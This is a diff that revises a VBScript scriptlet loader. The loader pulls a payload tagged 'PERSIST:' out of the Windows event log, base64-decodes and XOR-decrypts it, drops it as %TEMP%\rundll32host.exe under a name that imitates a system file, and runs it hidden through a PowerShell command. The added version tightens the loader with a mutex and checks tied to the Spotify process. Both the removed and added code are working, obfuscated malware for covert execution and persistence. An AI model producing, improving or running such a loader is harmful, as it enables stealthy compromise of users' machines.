@@ -2,86 +2,33 @@
 <script language="VBScript">
 On Error Resume Next
 
-Dim objShell, objFSO, objWMIService
+Dim objShell
 Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 
-Dim tempDir
+Dim tempDir, peFile
 tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
-Dim peFile
 peFile = tempDir & "\rundll32host.exe"
-Dim lockFile
-lockFile = tempDir & "\persist_running.tmp"
-Dim b64File
-b64File = tempDir & "\persist_b64.tmp"
 
-If objFSO.FileExists(peFile) Then
-    If objFSO.GetFile(peFile).Size > 0 Then
-        If Not objWMIService Is Nothing Then
-            Dim colProc
-            Set colProc = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'Spotify.exe'")
-            If colProc.Count = 0 Then
-                objShell.Run """" & peFile & """", 0, False
-            End If
-        End If
-        WScript.Quit
-    End If
-End If
-
-If objFSO.FileExists(lockFile) Then WScript.Quit
-Dim lockStream
-Set lockStream = objFSO.CreateTextFile(lockFile, True)
-lockStream.Close
-
-If objWMIService Is Nothing Then
-    objFSO.DeleteFile lockFile, True
-    WScript.Quit
-End If
-
-Dim colEvents
-Set colEvents = objWMIService.ExecQuery( _
-    "SELECT * FROM Win32_NTLogEvent WHERE SourceName = 'Microsoft-Windows-Wininit' AND EventCode = 19")
-If Err.Number <> 0 Then
-    objFSO.DeleteFile lockFile, True
-    WScript.Quit
-End If
-
-Dim eventMessage
-eventMessage = ""
-
-Dim objEvent
-For Each objEvent In colEvents
-    On Error Resume Next
-    Dim rawData
-    rawData = objEvent.InsertionStrings(0)
-    If Err.Number = 0 And Len(rawData) > 8 Then
-        If Left(rawData, 8) = "PERSIST:" Then
-            eventMessage = Mid(rawData, 9)
-            Exit For
-        End If
-    End If
-    Err.Clear
-Next
-
-If Len(eventMessage) = 0 Then
-    objFSO.DeleteFile lockFile, True
-    WScript.Quit
-End If
-
-Dim b64Stream
-Set b64Stream = objFSO.CreateTextFile(b64File, True)
-b64Stream.Write eventMessage
-b64Stream.Close
-
-objShell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command """ & _
-    "$b64=[IO.File]::ReadAllText('" & b64File & "');" & _
+Dim psCmd
+psCmd = "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command """ & _
+    "$pe='" & peFile & "';" & _
+    "$mx=New-Object System.Threading.Mutex($false,'Global\PersistenceSpotify');" & _
+    "if($mx.WaitOne(8000)){" & _
+    "try{" & _
+    "if(-not(Get-Process Spotify -EA 0)){" & _
+    "if(-not(Test-Path $pe) -or (Get-Item $pe).Length -eq 0){" & _
+    "Get-WinEvent -FilterHashtable @{LogName='Application';Id=19;ProviderName='Microsoft-Windows-Wininit'} -EA 0|" & _
+    "Where-Object{$_.Properties.Count -gt 0 -and $_.Properties[0].Value -clike 'PERSIST:*'}|" & _
+    "Select-Object -First 1|" & _
+    "ForEach-Object{$b64=$_.Properties[0].Value.Substring(8);" & _
     "$b=[Convert]::FromBase64String($b64);" & _
     "$k=0x77;for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor $k;$k=($k+5)-band 0xFF};" & _
-    "[IO.File]::WriteAllBytes('" & peFile & "',$b);" & _
-    "Start-Process '" & peFile & "' -WindowStyle Hidden""", 0, True
+    "[IO.File]::WriteAllBytes($pe,$b)};};" & _
+    "if(-not(Get-Process Spotify -EA 0) -and (Test-Path $pe) -and (Get-Item $pe).Length -gt 0){" & _
+    "Start-Process $pe -WindowStyle Hidden;" & _
+    "for($i=0;$i-lt10 -and -not(Get-Process Spotify -EA 0);$i++){Start-Sleep 500}}};" & _
+    "}finally{$mx.ReleaseMutex()|$mx.Dispose()}}"""
 
-objFSO.DeleteFile b64File, True
-objFSO.DeleteFile lockFile, True
+objShell.Run psCmd, 0, False
 </script>
 </scriptlet>
